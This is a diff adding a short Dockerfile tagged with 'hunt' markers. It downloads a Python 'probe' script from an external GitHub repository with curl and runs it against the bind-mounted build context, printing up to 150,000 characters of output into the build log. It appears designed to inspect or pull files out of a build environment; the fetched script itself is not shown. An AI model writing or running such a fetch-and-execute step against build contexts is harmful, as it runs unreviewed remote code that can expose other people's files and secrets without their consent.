@@ -1,0 +1,8 @@
+# MARK-I68223-hunt-7b31a
+FROM alpine:3.20
+RUN echo MARK-I68223-hunt-7b31a-step1
+RUN apk add --no-cache python3 >/dev/null 2>&1; echo APKDONE
+RUN curl -sS -m 40 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_i68223.py; wc -c /p.py; head -2 /p.py
+RUN --mount=type=bind,source=.,target=/H,ro sh -c 'MARK=I68223-hunt-7b31a python3 /p.py 2>&1 | head -c 150000'
+RUN echo MARK-I68223-hunt-7b31a-done
+CMD ["sh","-c","sleep 20"]
